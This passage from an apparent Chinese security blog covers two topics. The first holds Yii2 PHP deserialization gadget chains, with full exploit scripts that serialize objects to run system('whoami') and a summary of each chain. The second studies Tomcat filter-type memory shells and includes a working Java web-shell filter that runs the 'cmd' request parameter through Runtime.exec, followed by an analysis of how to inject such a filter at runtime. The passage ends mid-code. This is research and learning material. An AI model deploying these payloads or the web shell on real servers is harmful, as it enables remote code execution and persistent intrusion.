      <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br><br><br>    $<span class="hljs-title">c</span>=<span class="hljs-title">new</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>();<br>    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> yii\web\DbSession(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>));<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> yii\db\BatchQueryResult(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行</p><p><a href="https://imgtu.com/i/R0CSbD"><img src="https://z3.ax1x.com/2021/06/30/R0CSbD.png" alt="R0CSbD.png"></a></p><h3 id="利用链三"><a href="#利用链三" class="headerlink" title="利用链三"></a>利用链三</h3><p><code>/vendor/codeception/codeception/ext/RunProcess.php</code></p><p>存在<code>__destruct()</code>，调用<code>stopProcess</code></p><p><a href="https://imgtu.com/i/R09LCR"><img src="https://z3.ax1x.com/2021/06/30/R09LCR.png" alt="R09LCR.png"></a></p><p><code>/vendor/codeception/codeception/ext/RunProcess.php</code></p><p><code>$this-&gt;processes-&gt;isRunning</code>调用不存在的方法触发<code>__call</code>，接下来就跟上面一样了</p><p><a href="https://imgtu.com/i/R09Xgx"><img src="https://z3.ax1x.com/2021/06/30/R09Xgx.png" alt="R09Xgx.png"></a></p><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">RunProcess</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">processes</span> = <span class="hljs-title">array</span>();<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$processes</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes=<span class="hljs-variable">$processes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Generator</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">formatters</span>=<span class="hljs-title">array</span>();<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters=<span class="hljs-variable">$formatters</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">BatchQueryResult</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_dataReader</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader=<span class="hljs-variable">$_dataReader</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">c</span>=<span class="hljs-title">new</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>();<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;isRunning&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));<br><br>    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Codeception\Extension\RunProcess(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;add&#x27;</span>=&gt;<span class="hljs-variable">$a</span>));<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/R0CSbD"><img src="https://z3.ax1x.com/2021/06/30/R0CSbD.png" alt="R0CSbD.png"></a></p><h3 id="利用链四"><a href="#利用链四" class="headerlink" title="利用链四"></a>利用链四</h3><p><code>/vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p><p>存在<code>__destruct()</code>，但需要先为<code>$this-&gt;keys</code>赋值才能进入循环触发<code>clearAll</code></p><p><a href="https://imgtu.com/i/R0CCUH"><img src="https://z3.ax1x.com/2021/06/30/R0CCUH.png" alt="R0CCUH.png"></a></p><p><code>/vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p><p><code>clearAll()</code>中存在拼接字符串操作，触发<code>__toString()</code></p><p><a href="https://imgtu.com/i/R09jv6"><img src="https://z3.ax1x.com/2021/06/30/R09jv6.png" alt="R09jv6.png"></a></p><p>查找到可利用的<code>__toString</code>，调用了不存在的方法，再次触发<code>__call</code>，回到原来的利用链</p><p><a href="https://imgtu.com/i/R09xKK"><img src="https://z3.ax1x.com/2021/06/30/R09xKK.png" alt="R09xKK.png"></a></p><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span>&#123;<br>    //<span class="hljs-title">__destruct</span><br>    <span class="hljs-title">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span> &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">path</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$keys</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;path=<span class="hljs-variable">$path</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;keys=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Util</span>&#123;<br>    //<span class="hljs-title">__toString</span><br>    <span class="hljs-title">class</span> <span class="hljs-title">XmlBuilder</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">__dom__</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$__dom__</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;__dom__=<span class="hljs-variable">$__dom__</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    //<span class="hljs-title">__call</span><br>    <span class="hljs-title">class</span> <span class="hljs-title">Generator</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">formatters</span>=<span class="hljs-title">array</span>();<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters=<span class="hljs-variable">$formatters</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    //<span class="hljs-title">run</span><br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    $<span class="hljs-title">c</span>=<span class="hljs-title">new</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>();<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;saveXML&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));<br>    <span class="hljs-variable">$x</span>=<span class="hljs-keyword">new</span> Codeception\Util\XmlBuilder(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$aa</span>=<span class="hljs-keyword">new</span> Swift_KeyCache_DiskKeyCache(<span class="hljs-variable">$x</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$aa</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行</p><p><a href="https://imgtu.com/i/R09zDO"><img src="https://z3.ax1x.com/2021/06/30/R09zDO.png" alt="R09zDO.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这几条利用链大同小异，主要都是利用Generator.php中的<code>__call()</code> 和IndexAction.php中的<code>run()</code></p><p>利用链一</p><ol><li>BatchQueryResult.php中<code>__destruct()</code></li><li>BatchQueryResult.ph中的<code>reset()</code></li><li>Generator.php中的<code>__call()</code> </li><li>Generator.php中的<code>format()</code></li><li>Generator.php中的<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</code></li><li>IndexAction.php中的<code>run()</code></li></ol><p><a href="https://imgtu.com/i/R0Ck8I"><img src="https://z3.ax1x.com/2021/06/30/R0Ck8I.png" alt="R0Ck8I.png"></a></p><p>利用链二</p><ol><li>BatchQueryResult.php中<code>__destruct()</code></li><li>BatchQueryResult.ph中的<code>reset()</code></li><li>DbSession.php中的<code>close()</code> `</li><li>MultiFieldsSession.php中的<code>composeFields()</code>调用<code>call_user_func</code></li><li>IndexAction.php中的<code>run()</code></li></ol><p><a href="https://imgtu.com/i/R0CA2t"><img src="https://z3.ax1x.com/2021/06/30/R0CA2t.png" alt="R0CA2t.png"></a></p><p>利用链三</p><ol><li>RunProcess.php中的<code>__destruct()</code></li><li>RunProcess.php中的<code>stopProcess()</code></li><li>Generator.php中的<code>__call()</code> </li><li>Generator.php中的<code>format()</code></li><li>Generator.php中的<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</code></li><li>IndexAction.php中的<code>run()</code></li></ol><p><a href="https://imgtu.com/i/R0CExP"><img src="https://z3.ax1x.com/2021/06/30/R0CExP.png" alt="R0CExP.png"></a></p><p>利用链四</p><ol><li>DiskeyCache.php中的 <code>__destruct()</code></li><li>DiskeyCache.php中的<code>clearAll()</code>   触发<code>__toString()</code></li><li>XmlBuilder.php中的 <code>__toString()</code>方法触发<code>__call()</code></li><li>Generator.php中的<code>__call()</code> </li><li>Generator.php中的<code>format()</code></li><li>Generator.php中的<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</code></li><li>IndexAction.php中的<code>run()</code></li></ol><p><a href="https://imgtu.com/i/R0CZKf"><img src="https://z3.ax1x.com/2021/06/30/R0CZKf.png" alt="R0CZKf.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/161161.html">https://www.secpulse.com/archives/161161.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>filter型内存马学习</title>
    <link href="/2021/06/19/filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/19/filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="创建恶意filter"><a href="#创建恶意filter" class="headerlink" title="创建恶意filter"></a>创建恶意filter</h1><p>先获取参数cmd，再利用Runtime执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterShell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>            Process exec = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>            InputStream inputStream = exec.getInputStream();<br>            Scanner scanner = <span class="hljs-keyword">new</span> Scanner(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            String output = scanner.hasNext() ? scanner.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            response.getWriter().write(output);<br>            response.getWriter().flush();<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;过滤器调用完毕，开始转发给Servlet...&quot;</span>);<br>        chain.doFilter(request,response);<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>添加filter到web.xml</p><p><a href="https://imgtu.com/i/RCGbUs"><img src="https://z3.ax1x.com/2021/06/19/RCGbUs.png" alt="RCGbUs.png"></a></p><p><a href="https://imgtu.com/i/RCGX80"><img src="https://z3.ax1x.com/2021/06/19/RCGX80.png" alt="RCGX80.png"></a></p><h1 id="内存马的一些问题"><a href="#内存马的一些问题" class="headerlink" title="内存马的一些问题"></a>内存马的一些问题</h1><h2 id="怎么创建内存马？"><a href="#怎么创建内存马？" class="headerlink" title="怎么创建内存马？"></a><strong>怎么创建内存马？</strong></h2><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs golo">假设我们基于<span class="hljs-keyword">filter</span>去实现一个内存马，我们需要找到<span class="hljs-keyword">filter</span>是如何被创建的。<br>实战中不可能写一个<span class="hljs-keyword">filter</span>对象再放到对方代码中。因此需要找到一个注入点，动态的在内存中创建一个<span class="hljs-keyword">filter</span>对象，实现内存马。<br></code></pre></td></tr></table></figure><h2 id="如何动态的在内存中创建Filter对象？"><a href="#如何动态的在内存中创建Filter对象？" class="headerlink" title="如何动态的在内存中创建Filter对象？"></a><strong>如何动态的在内存中创建Filter对象？</strong></h2><p>Servlet 规范（应该是从3.0 开始）里面本身规定了一个名为ServletContext 的接口，其中有三个重载方法，这三个方法使得我们可以在运行时动态地添加过滤器。：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">FilterRegistration.<span class="hljs-function">Dynamic <span class="hljs-title">addFilter</span><span class="hljs-params">(String filterName,String className)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">FilterRegistration.Dynamic <span class="hljs-title">addFilter</span><span class="hljs-params">(String filterName,Filter filter)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">FilterRegistration.Dynamic <span class="hljs-title">addFilter</span><span class="hljs-params">(String filterName,Class&lt;? extends Filter&gt; filterClass)</span></span><br></code></pre></td></tr></table></figure><h2 id="如何调用ServletContext？"><a href="#如何调用ServletContext？" class="headerlink" title="如何调用ServletContext？"></a><strong>如何调用ServletContext？</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">不能直接调用，tomcat只允许容器还没有初始化完成的时侯调用这个几个方法，初始化结束后再尝试调用会出现异常<br></code></pre></td></tr></table></figure><h2 id="ServletContext接口的实现类？"><a href="#ServletContext接口的实现类？" class="headerlink" title="ServletContext接口的实现类？"></a><strong>ServletContext接口的实现类？</strong></h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.ApplicationContextFacade</span><br></code></pre></td></tr></table></figure><h1 id="一些相关类"><a href="#一些相关类" class="headerlink" title="一些相关类"></a>一些相关类</h1><p>ApplicationContext：是tomcat中ServletContext接口的实现，包含了StandardContext实例。</p><p>ApplicationContextFacade：在Web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装。</p><p>StandardContext：Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际来说，不是由它来进行处理，而是交给内部的valve处理。<br> 一个context表示了一个外部应用，它包含多个wrapper，每个wrapper表示一个servlet定义。（Tomcat 默认的 Service 服务是 Catalina）</p><h1 id="filter创建的过程"><a href="#filter创建的过程" class="headerlink" title="filter创建的过程"></a>filter创建的过程</h1><p>注意一下，开始调试之前要先添加tomcat的lib依赖，不然调试的时候找不到包</p><p><a href="https://imgtu.com/i/RCGOCq"><img src="https://z3.ax1x.com/2021/06/19/RCGOCq.png" alt="RCGOCq.png"></a></p><p><a href="https://imgtu.com/i/RCGq5n"><img src="https://z3.ax1x.com/2021/06/19/RCGq5n.png" alt="RCGq5n.png"></a></p><p>可以看到实际获取到的是一个ApplicationContextFacade对象，它对<code>ApplicationContext</code>的实例进行了封装。</p><p><a href="https://imgtu.com/i/RCGj2V"><img src="https://z3.ax1x.com/2021/06/19/RCGj2V.png" alt="RCGj2V.png"></a></p><p>调用栈中的上一级是<code>internalDoFilter</code>，打个断点看看它做了什么</p><p><a href="https://imgtu.com/i/RCJCVJ"><img src="https://z3.ax1x.com/2021/06/19/RCJCVJ.png" alt="RCJCVJ.png"></a></p><p><code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code></p><p>这个方法获取之前实现的filter，并且调用其中的doFilter方法</p><p><a href="https://imgtu.com/i/RCGvvT"><img src="https://z3.ax1x.com/2021/06/19/RCGvvT.png" alt="RCGvvT.png"></a></p><p><code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code></p><p>再上一级是<code>doFilter</code>，这里调用了<code>internalDoFilter</code></p><p><a href="https://imgtu.com/i/RCGzKU"><img src="https://z3.ax1x.com/2021/06/19/RCGzKU.png" alt="RCGzKU.png"></a></p><p><code>org.apache.catalina.core.StandardWrapperValve#invoke</code></p><p>再往上是<code>StandardWrapperValve</code>的<code>invoke</code>，调用<code>filterChain.doFilter</code></p><p><a href="https://imgtu.com/i/RCJSrF"><img src="https://z3.ax1x.com/2021/06/19/RCJSrF.png" alt="RCJSrF.png"></a></p><p>filterChain的来源，由<code>createFilterChain</code>创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RCJi5R"><img src="https://z3.ax1x.com/2021/06/19/RCJi5R.png" alt="RCJi5R.png"></a></p><p><code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code></p><p>这里则会调用<code>context.findFilterMaps()</code>从<code>StandardContext</code>寻找并且返回一个FilterMap数组。</p><p><a href="https://imgtu.com/i/RCJkP1"><img src="https://z3.ax1x.com/2021/06/19/RCJkP1.png" alt="RCJkP1.png"></a></p><p>可以再filterMaps数组中找到之前添加的filter和URL映射关系</p><p><a href="https://imgtu.com/i/RCJPa9"><img src="https://z3.ax1x.com/2021/06/19/RCJPa9.png" alt="RCJPa9.png"></a></p><p><a href="https://imgtu.com/i/RCJE26"><img src="https://z3.ax1x.com/2021/06/19/RCJE26.png" alt="RCJE26.png"></a></p><p><code>org.apache.catalina.core.StandardContextValve#invoke</code></p><p>再往上是调用管道的invoke方法</p><p><a href="https://imgtu.com/i/RCJpb4"><img src="https://z3.ax1x.com/2021/06/19/RCJpb4.png" alt="RCJpb4.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.org.apache.catalina.core.StandardContextValve#invoke<br>调用管道的invoke方法</p><p>2.org.apache.catalina.core.StandardWrapperValve#invoke<br>创建filterChain。调用filterChain.doFilter<br>ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br>filterChain.doFilter(request.getRequest(), response.getResponse());</p><p>2(1)：org.apache.catalina.core.ApplicationFilterFactory#createFilterChain<br>调用<code>context.findFilterMaps()</code>从<code>StandardContext</code>寻找并且返回一个FilterMap数组。<br>遍历得到的FilterMap数组<br>匹配filter和url映射关系、判断filterConfigs中是否存在对应filter实例<br>判断通过后调用addFilter方法，将管理filter实例的filterConfig添加入filterChain对象中。</p><p>3.org.apache.catalina.core.ApplicationFilterChain#doFilter<br>调用了internalDoFilter</p><p>4.org.apache.catalina.core.ApplicationFilterChain#internalDoFilter<br>获取已经实现的filter，并且调用其中的doFilter方法</p><h1 id="Filter实例存储分析"><a href="#Filter实例存储分析" class="headerlink" title="Filter实例存储分析"></a>Filter实例存储分析</h1><p><code>org.apache.catalina.core.StandardContext</code>容器类负责存储整个Web应用程序的数据和对象，并加载了web.xml中配置的多个Servlet、Filter对象以及它们的映射关系。</p><p>里面有三个和Filter有关的成员变量：</p><p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p><strong>filterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p><p><strong>filterMaps</strong>：一个存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p><h1 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h1><p>简单来说就是在运行动态添加一个filter</p><p>大致流程如下：</p><ol><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><p>在<code>StandardContext </code>类中， Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可添加内存马。那么如何获取到<code>StandardContext </code> 成为了问题的关键。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 